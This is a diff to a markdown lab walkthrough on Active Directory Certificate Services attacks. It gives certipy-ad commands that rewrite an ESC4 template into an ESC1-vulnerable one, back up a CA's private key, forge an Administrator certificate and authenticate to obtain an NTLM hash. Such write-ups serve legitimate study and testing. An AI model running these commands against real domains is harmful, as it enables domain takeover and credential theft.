@@ -147,16 +147,61 @@ certipy-ad auth -pfx administrator --dc-ip <ip>
 - Leveraging the template dangerous permissions, we'll leverage the permissions to make it more dangerous.
 
 ```bash
-certipy-ad template -u 'dev@papa.local' -p password -template ESC3 -target 192.168.130.136 -save-configuration ESC3 
+certipy-ad template   -u dev@papa.local   -p password   -template ESC4   -write-default-configuration \  -no-save 
 ```
 
-- The vulnerable template I created by checking  the templates to update the `pKIExtendedKeyUsage` and `msPKI-Certificate-Application-Policy`-:
+<img width="1885" height="644" alt="image" src="https://github.com/user-attachments/assets/dc082b3e-0724-4756-91b8-a516513b4b3a" />
 
-```json
+>-write-default-configuration enables ENROLLEE_SUPPLIES_SUBJECT and configures Client Authentication EKU making the template ESC1-vulnerable.
+-no-save skips saving a backup of the original configuration (omit this flag in real engagements to preserve the ability to restore).
 
+-  Exploiting ESC1 again-:
+
+<img width="1748" height="344" alt="image" src="https://github.com/user-attachments/assets/9a280bb5-9a53-4062-9f95-8ba911075353" />
+
+- Auth as administrator-:
+
+```bash
+certipy-ad auth --pfx administrator.pfx --dc-ip ip
 ```
-  
 
+<img width="1172" height="363" alt="image" src="https://github.com/user-attachments/assets/dd5deae8-65a4-429b-955b-0e262639bd24" />
+
+
+----------
+
+### ESC 5: : Vulnerable PKI Object Access Control
+
+------------
+
+- ESC5 is a high-risk certificate attack targeting Active Directory Certificate Services (ADCS). This ADCS attack exploits insecure access to the Certificate Authority (CA)’s private key. When attackers gain local admin access on the CA server, they can export the private key. This allows them to forge valid certificates for any AD account, including Domain Admins. This certificate attack allows adversaries to authenticate via Kerberos PKINIT, enabling lateral movement across the network without needing passwords or hashes
+- User must be part of Domain Admins:
+- Fist step is to back up CA certificate and Private key-:
+
+```bash
+certipy-ad ca -backup -u administrator@papa.local -p hello -ca LAB-ROOT-CA -target 192.168.130.136
+```
+
+<img width="1044" height="390" alt="image" src="https://github.com/user-attachments/assets/171d4e2c-a820-4c50-a071-c91d5728c822" />
+
+- Forge a certificate for a user-:
+
+```bash
+certipy-ad forge -ca-pfx 'LAB-ROOT-CA.pfx' -upn Administrator@papa.local -sid "S-1-5-21-1749148288-4111076168-2771517274-500"
+```
+
+<img width="785" height="177" alt="image" src="https://github.com/user-attachments/assets/6c4da703-82ba-4b14-9967-602ba93b5475" />
+
+- Authenticating for ntlm hash-:
+
+```bash
+certipy-ad auth -pfx administrator_forged.pfx -dc-ip 192.168.130.136
+```
+
+<img width="1163" height="402" alt="image" src="https://github.com/user-attachments/assets/414dbed1-27c8-4986-aec0-1927b1c8a61b" />
+
+
+-------------------
 
 
 
